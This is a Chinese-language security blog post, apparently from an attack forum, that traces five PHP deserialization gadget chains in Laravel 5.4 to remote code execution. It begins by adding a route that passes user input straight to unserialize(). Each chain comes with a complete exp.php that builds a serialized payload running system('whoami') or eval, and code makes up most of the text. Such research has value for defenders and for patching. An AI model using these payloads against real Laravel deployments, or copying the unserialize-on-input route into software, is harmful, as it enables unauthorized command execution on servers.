0x00 环境搭建
=========

```sh
composer create-project --prefer-dist laravel/laravel laravel5.1 "5.1.*"
#下载的版本应该是 5.4.30的。
```

添加路由(routes/web.php)

```php
Route::get('/index', function () {
    $payload=$_GET['cmd'];
    echo $payload;
    echo '<br>';
    unserialize(($payload));
    return 'hello binbin';
});
```

0x01 链子1
========

**通过全局搜索`function __destruct(`**

发现

```php
//lib/classes/Swift/Transport/AbstractSmtpTransport.php
public function __destruct()
{
    try {
        $this-&gt;stop();
    } catch (Exception $e) {
    }
}
```

**跟进`stop()`**

```php
//lib/classes/Swift/Transport/AbstractSmtpTransport.php
public function stop()
{
    if ($this-&gt;_started) {
        if ($evt = $this-&gt;_eventDispatcher-&gt;createTransportChangeEvent($this)) {//__call
            $this-&gt;_eventDispatcher-&gt;dispatchEvent($evt, 'beforeTransportStopped');
            if ($evt-&gt;bubbleCancelled()) {
                return;
            }
        }

        try {
            $this-&gt;executeCommand("QUIT\r\n", array(221));
        } catch (Swift_TransportException $e) {
        }

        try {
            $this-&gt;_buffer-&gt;terminate();//__call

            if ($evt) {
                $this-&gt;_eventDispatcher-&gt;dispatchEvent($evt, 'transportStopped');
            }
        } catch (Swift_TransportException $e) {
            $this-&gt;_throwException($e);
        }
    }
    $this-&gt;_started = false;
}
```

**寻找`__call`方法**

```php
//src/Faker/ValidGenerator.php
public function __call($name, $arguments)
{
    $i = 0;
    do {
        $res = call_user_func_array(array($this-&gt;generator, $name), $arguments);
        $i++;
        if ($i &gt; $this-&gt;maxRetries) {
            throw new \OverflowException(sprintf('Maximum retries of %d reached without finding a valid value', $this-&gt;maxRetries));
        }
    } while (!call_user_func($this-&gt;validator, $res));

    return $res;
}
```

上面的方法中，`!call_user_func($this-&gt;validator, $res)`可用，只需要控制`$res`即可RCE

`array($this-&gt;generator, $name)`表示某个类的某个方法，于是**寻找一个返回值可控的函数或者`__call`方法**

```php
//src/Faker/DefaultGenerator.php
//laravel中经典的方法
public function __call($method, $attributes)
{
    return $this-&gt;default;
}
```

于是就可以进行RCE

注意：由于`Swift_Transport_AbstractSmtpTransport`是一个抽象类，所以要使用它的子类进行序列化`Swift_Transport_EsmtpTransport`

**exp.php**

```php
&lt;?php
namespace Faker {

    class ValidGenerator
    {
        protected $generator;
        protected $validator;
        protected $maxRetries;

        public function __construct($generator, $validator ,$maxRetries)
        {
            $this-&gt;generator = $generator;
            $this-&gt;validator = $validator;
            $this-&gt;maxRetries = $maxRetries;
        }
    }
}

namespace Faker {
    class DefaultGenerator
    {
        protected $default;

        public function __construct($default)
        {
            $this-&gt;default = $default;
        }
    }
}

namespace {

    use Faker\DefaultGenerator;
    use Faker\ValidGenerator;

    class Swift_Transport_EsmtpTransport
    {
        protected $_started = true;
        protected $_eventDispatcher;

        public function __construct($_started, $_eventDispatcher)
        {
            $this-&gt;_started = $_started;
            $this-&gt;_eventDispatcher = $_eventDispatcher;
        }
    }

    $defaultGenerator = new DefaultGenerator("whoami");
    $validGenerator = new ValidGenerator($defaultGenerator,"system",9);
    $swift_Transport_EsmtpTransport = new Swift_Transport_EsmtpTransport(true, $validGenerator);
    echo urlencode((serialize($swift_Transport_EsmtpTransport)));
}

```

0x02 链子2
========

**寻找`__destruct`方法**

```php
//lib/classes/Swift/KeyCache/DiskKeyCache.php
public function __destruct()
{
    foreach ($this-&gt;_keys as $nsKey =&gt; $null) {
        $this-&gt;clearAll($nsKey);
    }
}
```

**跟进`clearAll`方法**

```php
//lib/classes/Swift/KeyCache/DiskKeyCache.php
public function clearAll($nsKey)
{
    if (array_key_exists($nsKey, $this-&gt;_keys)) {
        foreach ($this-&gt;_keys[$nsKey] as $itemKey =&gt; $null) {
            $this-&gt;clearKey($nsKey, $itemKey);
        }
        if (is_dir($this-&gt;_path.'/'.$nsKey)) {
            rmdir($this-&gt;_path.'/'.$nsKey);
        }
        unset($this-&gt;_keys[$nsKey]);
    }
}
```

**跟进`clearKey`方法**

```php
//lib/classes/Swift/KeyCache/DiskKeyCache.php
public function clearKey($nsKey, $itemKey)
{
    if ($this-&gt;hasKey($nsKey, $itemKey)) {
        $this-&gt;_freeHandle($nsKey, $itemKey);
        unlink($this-&gt;_path.'/'.$nsKey.'/'.$itemKey);
    }
}
```

**跟进`hasKey`方法**

```php
public function hasKey($nsKey, $itemKey)
{
    return is_file($this-&gt;_path.'/'.$nsKey.'/'.$itemKey);
    //function is_file (string $filename): bool
}
```

`is_file`方法会将`$this-&gt;_path`转换成字符串，会调用`$this-&gt;_path`的`__tostring`

**搜索`__tostring`**

```php
//library/Mockery/Generator/DefinedTargetClass.php
public function __toString()
{
    return $this-&gt;getName();
}

public function getName()
{
    return $this-&gt;rfc-&gt;getName();
}
```

于是就可以调用`__call`方法，就可以使用**链子1的后面的链子**

**寻找`__call`方法**

```php
//src/Faker/ValidGenerator.php
public function __call($name, $arguments)
{
    $i = 0;
    do {
        $res = call_user_func_array(array($this-&gt;generator, $name), $arguments);
        $i++;
        if ($i &gt; $this-&gt;maxRetries) {
            throw new \OverflowException(sprintf('Maximum retries of %d reached without finding a valid value', $this-&gt;maxRetries));
        }
    } while (!call_user_func($this-&gt;validator, $res));

    return $res;
}
```

上面的方法中，`!call_user_func($this-&gt;validator, $res)`可用，只需要控制`$res`即可RCE

`array($this-&gt;generator, $name)`表示某个类的某个方法，于是**寻找一个返回值可控的函数或者`__call`方法**

```php
//src/Faker/DefaultGenerator.php
//laravel中经典的方法
public function __call($method, $attributes)
{
    return $this-&gt;default;
}
```

**exp.php**

```php
&lt;?php

namespace Faker {

    class ValidGenerator
    {
        protected $generator;
        protected $validator;
        protected $maxRetries;

        public function __construct($generator, $validator ,$maxRetries)
        {
            $this-&gt;generator = $generator;
            $this-&gt;validator = $validator;
            $this-&gt;maxRetries = $maxRetries;
        }
    }

    class DefaultGenerator
    {
        protected $default;

        public function __construct($default)
        {
            $this-&gt;default = $default;
        }
    }
}

namespace Mockery\Generator {

    class DefinedTargetClass
    {
        private $rfc;

        public function __construct($rfc)
        {
            $this-&gt;rfc = $rfc;
        }

    }
}

namespace {

    use Faker\DefaultGenerator;
    use Faker\ValidGenerator;
    use Mockery\Generator\DefinedTargetClass;

    class Swift_KeyCache_DiskKeyCache
    {
        private $_keys;
        private $_path;

        public function __construct($_keys, $_path)
        {
            $this-&gt;_keys = $_keys;
            $this-&gt;_path = $_path;
        }

    }
    $defaultGenerator = new DefaultGenerator("whoami");
    $validGenerator = new ValidGenerator($defaultGenerator,"system",3);
    $definedTargetClass = new DefinedTargetClass($validGenerator);
    $swift_KeyCache_DiskKeyCache = new Swift_KeyCache_DiskKeyCache(array("binbin"=&gt;array("binbin","binbin")),$definedTargetClass);
    echo urlencode(serialize($swift_KeyCache_DiskKeyCache));

}
```

0x03 链子3
========

**寻找`__destruct`方法**

```php
//Pipes/WindowsPipes.php
public function __destruct()
{
    $this-&gt;close();
    $this-&gt;removeFiles();
}

private function removeFiles()
{
    foreach ($this-&gt;files as $filename) {
        //function file_exists (string $filename): bool
        if (file_exists($filename)) {
            @unlink($filename);
        }
    }
    $this-&gt;files = array();
}
```

可以调用`$filename`的`__toString`

**下面使用链子2的后面的路径**

**搜索`__tostring`**

```php
//library/Mockery/Generator/DefinedTargetClass.php
public function __toString()
{
    return $this-&gt;getName();
}

public function getName()
{
    return $this-&gt;rfc-&gt;getName();
}
```

于是就可以调用`__call`方法，就可以使用**链子1的后面的链子**

**寻找`__call`方法**

```php
//src/Faker/ValidGenerator.php
public function __call($name, $arguments)
{
    $i = 0;
    do {
        $res = call_user_func_array(array($this-&gt;generator, $name), $arguments);
        $i++;
        if ($i &gt; $this-&gt;maxRetries) {
            throw new \OverflowException(sprintf('Maximum retries of %d reached without finding a valid value', $this-&gt;maxRetries));
        }
    } while (!call_user_func($this-&gt;validator, $res));

    return $res;
}

```

上面的方法中，`!call_user_func($this-&gt;validator, $res)`可用，只需要控制`$res`即可RCE

`array($this-&gt;generator, $name)`表示某个类的某个方法，于是**寻找一个返回值可控的函数或者`__call`方法**

```php
//src/Faker/DefaultGenerator.php
//laravel中经典的方法
public function __call($method, $attributes)
{
    return $this-&gt;default;
}

```

**exp.php**

```php
&lt;?php

namespace Faker {

    class ValidGenerator
    {
        protected $generator;
        protected $validator;
        protected $maxRetries;

        public function __construct($generator, $validator ,$maxRetries)
        {
            $this-&gt;generator = $generator;
            $this-&gt;validator = $validator;
            $this-&gt;maxRetries = $maxRetries;
        }
    }

    class DefaultGenerator
    {
        protected $default;

        public function __construct($default)
        {
            $this-&gt;default = $default;
        }
    }
}

namespace Mockery\Generator {

    class DefinedTargetClass
    {
        private $rfc;

        public function __construct($rfc)
        {
            $this-&gt;rfc = $rfc;
        }

    }
}

/*
 * This file is part of the Symfony package.
 *
 * (c) Fabien Potencier 
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */

namespace Symfony\Component\Process\Pipes {
    class WindowsPipes
    {
        private $files;

        public function __construct($files)
        {
            $this-&gt;files = $files;
        }

    }
}

namespace {
    use Faker\DefaultGenerator;
    use Faker\ValidGenerator;
    use Mockery\Generator\DefinedTargetClass;
    use Symfony\Component\Process\Pipes\WindowsPipes;

    $defaultGenerator = new DefaultGenerator("whoami");
    $validGenerator = new ValidGenerator($defaultGenerator,"system",3);
    $definedTargetClass = new DefinedTargetClass($validGenerator);
    $windowsPipes = new WindowsPipes(array($definedTargetClass));
    echo urlencode(serialize($windowsPipes));

}
```

入口找得差不多了下面继续寻找可以利用的`__call`

**由于链子1入口比较简单，所以以链子1作为入口，寻找可以利用的`__call`**

0x04 链子4
========

**通过全局搜索`function __destruct(`**

发现

```php
//lib/classes/Swift/Transport/AbstractSmtpTransport.php
public function __destruct()
{
    try {
        $this-&gt;stop();
    } catch (Exception $e) {
    }
}
```

**跟进`stop()`**

```php
//lib/classes/Swift/Transport/AbstractSmtpTransport.php
public function stop()
{
    if ($this-&gt;_started) {
        if ($evt = $this-&gt;_eventDispatcher-&gt;createTransportChangeEvent($this)) {//__call
            $this-&gt;_eventDispatcher-&gt;dispatchEvent($evt, 'beforeTransportStopped');
            if ($evt-&gt;bubbleCancelled()) {
                return;
            }
        }

        try {
            $this-&gt;executeCommand("QUIT\r\n", array(221));
        } catch (Swift_TransportException $e) {
        }

        try {
            $this-&gt;_buffer-&gt;terminate();//__call

            if ($evt) {
                $this-&gt;_eventDispatcher-&gt;dispatchEvent($evt, 'transportStopped');
            }
        } catch (Swift_TransportException $e) {
            $this-&gt;_throwException($e);
        }
    }
    $this-&gt;_started = false;
}
```

**寻找`__call`方法**

```php
//src/Illuminate/Database/DatabaseManager.php
public function __call($method, $parameters)
{
    return call_user_func_array([$this-&gt;connection(), $method], $parameters);
}

public function connection($name = null)
{
    list($name, $type) = $this-&gt;parseConnectionName($name);
    //返回 [$this-&gt;app['config']['database.default'], null]
    //$name=$this-&gt;app['config']['database.default']

    if (! isset($this-&gt;connections[$name])) {
        $connection = $this-&gt;makeConnection($name);

        $this-&gt;setPdoForType($connection, $type);

        $this-&gt;connections[$name] = $this-&gt;prepare($connection);
    }

    return $this-&gt;connections[$name];
}

protected function parseConnectionName($name)//$name=null
{
    $name = $name ?: $this-&gt;getDefaultConnection();

    return Str::endsWith($name, ['::read', '::write'])
        ? explode('::', $name, 2) : [$name, null];
}

public function getDefaultConnection()
{
    return $this-&gt;app['config']['database.default'];
}

protected function makeConnection($name)//$name=$this-&gt;app['config']['database.default']
{
    $config = $this-&gt;getConfig($name);
    //返回$this-&gt;app['config']['database.connections'];
    if (isset($this-&gt;extensions[$name])) {
        return call_user_func($this-&gt;extensions[$name], $config, $name);
    }

    $driver = $config['driver'];

    if (isset($this-&gt;extensions[$driver])) {
        return call_user_func($this-&gt;extensions[$driver], $config, $name);
        //RCE
    }

    return $this-&gt;factory-&gt;make($config, $name);
}

protected function getConfig($name) //$name=$this-&gt;app['config']['database.default']
{
    $name = $name ?: $this-&gt;getDefaultConnection();//$name存在，不改变

    $connections = $this-&gt;app['config']['database.connections'];

    if (is_null($config = Arr::get($connections, $name))) {
        //$config=$this-&gt;app['config']['database.connections'];
        throw new InvalidArgumentException("Database [$name] not configured.");
    }

    return $config;
}

//src/Illuminate/Support/Arr.php
public static function get($array, $key, $default = null)
{
    if (is_null($key)) {
        return $array;
    }

    if (isset($array[$key])) {
        return $array[$key];
    }

    foreach (explode('.', $key) as $segment) {
        if (! is_array($array) || ! array_key_exists($segment, $array)) {
            return value($default);
        }

        $array = $array[$segment];
    }

    return $array;
}
```

对于`call_user_func($this-&gt;extensions[$name], $config, $name);`有两个参数的利用

本来想着system()可以接受两个参数，正常执行

```php
call_user_func("system","calc","binbin");
//可以正常弹计算器
```

![image-20221007161016275.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-fa219660a189e794b31b23eb2f175d0439643401.png)

**exp.php(不能用)**

```php
&lt;?php
namespace Illuminate\Database {

    class DatabaseManager
    {
        protected $app;
        protected $extensions;

        public function __construct()
        {
            $this-&gt;app['config']['database.default']="binbin";
            $this-&gt;app['config']['database.connections']=array("binbin"=&gt;"whoami");
            $this-&gt;extensions = array("binbin" =&gt;"system");
        }

    }
}

namespace {
    use Illuminate\Database\DatabaseManager;

    class Swift_Transport_EsmtpTransport
    {
        protected $_started = true;
        protected $_eventDispatcher;

        public function __construct($_started, $_eventDispatcher)
        {
            $this-&gt;_started = $_started;
            $this-&gt;_eventDispatcher = $_eventDispatcher;
        }
    }

    $databaseManager = new DatabaseManager();
    $swift_Transport_EsmtpTransport = new Swift_Transport_EsmtpTransport(true, $databaseManager);
    echo urlencode((serialize($swift_Transport_EsmtpTransport)));
}
```

但是不知道为什么反序列化时不可以使用

只能使用

```php
call_user_func("call_user_func","system","calc");

```

**exp.php**

```php
&lt;?php

namespace Illuminate\Database {

    class DatabaseManager
    {
        protected $app;
        protected $extensions;

        public function __construct()
        {
            $this-&gt;app['config']['database.default']="whoami";
            $this-&gt;app['config']['database.connections']=array("whoami"=&gt;"system");
            $this-&gt;extensions = array("whoami" =&gt;"call_user_func");
        }

    }
}

namespace {

    use Illuminate\Database\DatabaseManager;

    class Swift_Transport_EsmtpTransport
    {
        protected $_started = true;
        protected $_eventDispatcher;

        public function __construct($_started, $_eventDispatcher)
        {
            $this-&gt;_started = $_started;
            $this-&gt;_eventDispatcher = $_eventDispatcher;
        }
    }

    $databaseManager = new DatabaseManager();
    $swift_Transport_EsmtpTransport = new Swift_Transport_EsmtpTransport(true, $databaseManager);
    echo urlencode((serialize($swift_Transport_EsmtpTransport)));
}

```

0x05 链子5
========

**寻找`__destruct`方法**

```php
//Pipes/WindowsPipes.php
public function __destruct()
{
    $this-&gt;close();
    $this-&gt;removeFiles();
}

private function removeFiles()
{
    foreach ($this-&gt;files as $filename) {
        //function file_exists (string $filename): bool
        if (file_exists($filename)) {
            @unlink($filename);
        }
    }
    $this-&gt;files = array();
}
```

可以调用`$filename`的`__toString`

**下面使用链子2的后面的路径**

**搜索`__tostring`**

```php
//src/Prophecy/Argument/Token/ObjectStateToken.php
public function __toString()
{
    return sprintf('state(%s(), %s)',
                   $this-&gt;name,
                   $this-&gt;util-&gt;stringify($this-&gt;value)
                  );
}
```

**寻找`__call`方法**

```php
//src/Illuminate/Validation/Validator.php
public function __call($method, $parameters)//$method=createTransportChangeEvent
{
    $rule = Str::snake(substr($method, 8));
    //$rule= ansportChangeEvent
    if (isset($this-&gt;extensions[$rule])) {
        return $this-&gt;callExtension($rule, $parameters);
    }
    throw new BadMethodCallException("Method [$method] does not exist.");
}

protected function callExtension($rule, $parameters)
{
    $callback = $this-&gt;extensions[$rule];//$rule= ansportChangeEvent

    if ($callback instanceof Closure) {
        return call_user_func_array($callback, $parameters);
    } elseif (is_string($callback)) {
        return $this-&gt;callClassBasedExtension($callback, $parameters);
    }
}

protected function callClassBasedExtension($callback, $parameters)
{
    list($class, $method) = explode('@', $callback);
    return call_user_func_array([$this-&gt;container-&gt;make($class), $method], $parameters);
}
```

此处可以控制`$extensions`从而控制`$callback`然后就可以控制`$class`和`$method`，如果可以控制`$this-&gt;container-&gt;make($class)`就可以调用任何类的任何方法

**控制`$this-&gt;container-&gt;make($class)`**

可以使用经典的DefaultGenerator类中的\_\_call返回任意的对象

```php
//src/Faker/DefaultGenerator.php
public function __call($method, $attributes)
{
    return $this-&gt;default;
}

```

下面寻找一些危险的函数 如`eval`，`system`，`call_user_func`，`shell_exec`，`file_put_contents`等 ，尝试进行调用

```php
class EvalLoader implements Loader
{
    public function load(MockDefinition $definition)
    {
        if (class_exists($definition-&gt;getClassName(), false)) {
            return;
        }

        eval("?&gt;" . $definition-&gt;getCode());
    }
}
```

**跟进`getCode`**

```php
//library/Mockery/Generator/MockDefinition.php
public function getClassName()
{
    return $this-&gt;config-&gt;getName();
}

public function getCode()
{
    return $this-&gt;code;
}
```

可以使用经典的DefaultGenerator类中的\_\_call返回任意的对象

```php
//src/Faker/DefaultGenerator.php
public function __call($method, $attributes)
{
    return $this-&gt;default;
}
```

exp.php

```php
&lt;?php

namespace Prophecy\Argument\Token {
    class ObjectStateToken
    {
        private $value;
        private $util;

        public function __construct($value, $util)
        {
            $this-&gt;value = $value;
            $this-&gt;util = $util;
        }

    }
}

namespace Faker {
    class DefaultGenerator
    {
        protected $default;

        public function __construct($default)
        {
            $this-&gt;default = $default;
        }
    }
}

namespace Symfony\Component\Process\Pipes {
    class WindowsPipes
    {
        private $files;

        public function __construct($files)
        {
            $this-&gt;files = $files;
        }

    }
}

namespace Mockery\Loader {

    class EvalLoader
    {
    }
}

namespace Illuminate\Validation {

    class Validator
    {
        protected $extensions;
        protected $container;

        public function __construct($extensions,$container)
        {
            $this-&gt;extensions = $extensions;
            $this-&gt;container = $container;

        }

    }
}
namespace Mockery\Generator {

    use Faker\DefaultGenerator;
    use Mockery\Loader\EvalLoader;

    class MockDefinition
    {
        protected $config;
        protected $code;
        public function __construct($config)
        {
            $this-&gt;config=$config;
            $this-&gt;code = ' &lt;?php var_dump(system("whoami"));';
        }
    }
}
namespace {

    use Faker\DefaultGenerator;
    use Illuminate\Validation\Validator;
    use Mockery\Generator\MockDefinition;
    use Mockery\Loader\EvalLoader;
    use Prophecy\Argument\Token\ObjectStateToken;
    use Symfony\Component\Process\Pipes\WindowsPipes;

    $evalLoader = new EvalLoader();
    $defaultGenerator1 = new DefaultGenerator("binbin");
    $mockDefinition = new MockDefinition($defaultGenerator1);
    $defaultGenerator = new DefaultGenerator($evalLoader);
    $validator = new Validator(array("y"=&gt;"binbin@load"),$defaultGenerator);
    $objectStateToken = new ObjectStateToken($mockDefinition,$validator);
    $windowsPipes = new WindowsPipes(array($objectStateToken));
    echo urlencode((serialize($windowsPipes)));
}

```

0x06 提问：
========

**链子4中**

对于`call_user_func($this-&gt;extensions[$name], $config, $name);`有两个参数的利用

本来想着system()可以接受两个参数，正常执行

```php
call_user_func("system","calc","binbin");
//可以正常弹计算器
```

![image-20221007161016275.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-23831e5d4d7eeb538ff917e2a64f4ae398eea4d3.png)

**exp.php(不能用)**

```php
&lt;?php
namespace Illuminate\Database {

    class DatabaseManager
    {
        protected $app;
        protected $extensions;

        public function __construct()
        {
            $this-&gt;app['config']['database.default']="binbin";
            $this-&gt;app['config']['database.connections']=array("binbin"=&gt;"whoami");
            $this-&gt;extensions = array("binbin" =&gt;"system");
        }

    }
}

namespace {
    use Illuminate\Database\DatabaseManager;

    class Swift_Transport_EsmtpTransport
    {
        protected $_started = true;
        protected $_eventDispatcher;

        public function __construct($_started, $_eventDispatcher)
        {
            $this-&gt;_started = $_started;
            $this-&gt;_eventDispatcher = $_eventDispatcher;
        }
    }

    $databaseManager = new DatabaseManager();
    $swift_Transport_EsmtpTransport = new Swift_Transport_EsmtpTransport(true, $databaseManager);
    echo urlencode((serialize($swift_Transport_EsmtpTransport)));
}
```

为什么反序列化时不可以使用？希望有师傅评论区解答一下